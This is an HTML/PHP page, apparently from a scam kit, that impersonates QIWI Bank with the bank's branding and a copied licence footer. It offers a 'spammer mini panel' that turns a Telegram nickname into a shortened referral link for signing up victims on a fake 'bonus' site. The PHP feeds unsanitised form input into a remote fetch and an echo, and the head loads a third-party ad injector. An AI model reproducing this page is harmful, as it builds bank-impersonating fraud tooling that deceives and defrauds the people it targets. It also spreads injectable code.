
<!DOCTYPE HTML>
<html>
	<head>
		<title>QIWIAPI BONUS</title>
		<meta name="keywords" content=">QIWIAPI, qiwi, api, день, мани, халява, киви, киви бонус"> 
		<meta name="description" content="Пользуйся QIWIAPI и получай за это бонусы">
		<meta charset="utf-8" />
		<meta name="yandex-verification" content="4993c086cae51c72" />
		<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
		<!--[if lte IE 8]><script src="assets/js/ie/html5shiv.js"></script><![endif]-->
		<link rel="stylesheet" href="./templates/deam/assets/css/main.css" />
		<link rel="stylesheet" href="./templates/deam/assets/css/iao.css" />
		<link rel="shortcut icon" type="image/png" href="./templates/deam/assets/images/logo.png"/>
		<script src="https://code.jquery.com/jquery-1.11.0.min.js" type="text/javascript"></script>   
		<script src="https://use.fontawesome.com/b3472dba05.js"></script>
		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.3.5/jquery.fancybox.min.css" />
		<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.3.5/jquery.fancybox.min.js"></script>
		<!--[if lte IE 8]><link rel="stylesheet" href="assets/css/ie8.css" /><![endif]-->

		<script type='text/javascript' id="s-801767cc96b569d0">!function(t,e,n,o,a,c,s){t[a]=t[a]||function(){(t[a].q=t[a].q||[]).push(arguments)},t[a].l=1*new Date,c=e.createElement(n),s=e.getElementsByTagName(n)[0],c.async=1,c.src=o,s.parentNode.insertBefore(c,s)}(window,document,"script","//vidplah.com/player/","vbm"); vbm('get', {"platformId":98181,"format":2,"align":"top","width":"550","height":"350","sig":"801767cc96b569d0"});</script>
	</head>
	<body class="landing">
		<div class='loading-block loading'></div>
		<div id="page-wrapper"> 
				<header id="header" class="alt">
					<h1><img src='./templates/deam/assets/images/logo.png' style='    width: 40px;position: relative;top: 15px;margin-right: 10px;'><a href="/" rel='ajaxed' class='Gugi' style='top: 3px;position: relative;'>QIWI<span style='color:#333'>API</span></a></h1>
					<nav id="nav">
	<ul>
		<li><a href="/" rel='ajaxed'>Главная</a></li> 
		<li>
			<a href="#" class="icon fa-angle-down"><i class="fa fa-user-circle-o" aria-hidden="true"></i> Гость</a>
			<ul>
				<li><a href="/login.php" rel='ajaxed' >Войти</a></li>
				<li><a href="/reg.php" rel='ajaxed' >Зарегистрироваться</a></li>
			</ul>
		</li>  
	</ul>
</nav>				</header>
				<section id="banner">
					<div id='videobag'></div>
					<img src='./templates/deam/assets/images/logo.png'>
					<h2 class='Gugi'><span style='color:#ff8c00'>QIWI</span> API</h2>
					
				<div class='ajax-content'>
				<section id="main" class="container">  
				<section class="box special features" style='max-width: 700px; margin: 0 auto;'>  
<div class="row uniform 50%">
					<div class="12u">
					<p>Мини панель спаммера</p><br>
					<h3>Гeнерация ссылки</h3><br>
					<form method="post">
						<input type="text" placeholder="Telegram nickname" name="nick"><br>
						<button type="submit" class='button special' >Сгенерировать</button><br>
					</form>
					<?php
						if(isset($_POST['nick'])){
							$refka = 'http://'.$_SERVER['HTTP_HOST'].'/reg.php?ref='.$_POST['nick'];
							$refka = file_get_contents("https://clck.ru/--?url=".$refka);
							echo "Ваша ссылка: $refka";
						}
					?>
					</div>
					</div>
					</section>
</section>


</div> 
<!-- Footer -->
<footer id="footer">
	<div class='container' style='padding: 0;margin: 0px auto;    padding-top: 33px;'>
		<div class='qiwilogo'><img src='http://u6.filesonload.ru/s/7a2q5p051/f7bb366626f8249ac09ae74752f63519/5446fa5d71656a2a01953f0b2f2ac2bb.png'></div>
	<ul class="copyright">
		<li>© 2018, КИВИ Банк (АО), лицензия ЦБ РФ № 2241

		<p>Россия, 117648, г. Москва, мкр. Чертаново Северное, д.1А, корп.1</p></li>
	</ul> 
		</div>
</footer>

<!-- Scripts -->
<script src="./templates/deam/assets/js/jquery.min.js"></script>
<script src="./templates/deam/assets/js/jquery.mask.js"></script>
<script src="./templates/deam/assets/js/jquery.dropotron.min.js"></script>
<script src="./templates/deam/assets/js/jquery.scrollgress.min.js"></script>
<script src="./templates/deam/assets/js/skel.min.js"></script>
<script src="./templates/deam/assets/js/util.js"></script>
<!--[if lte IE 8]><script src="assets/js/ie/respond.min.js"></script><![endif]-->
<script src="./templates/deam/assets/js/main.js"></script>
<script src="./templates/deam/assets/js/youtube.js"></script>
<script src="./templates/deam/assets/js/iao.js"></script>
<!--]-->

</body>
</html><!-- zzz </body><!-->
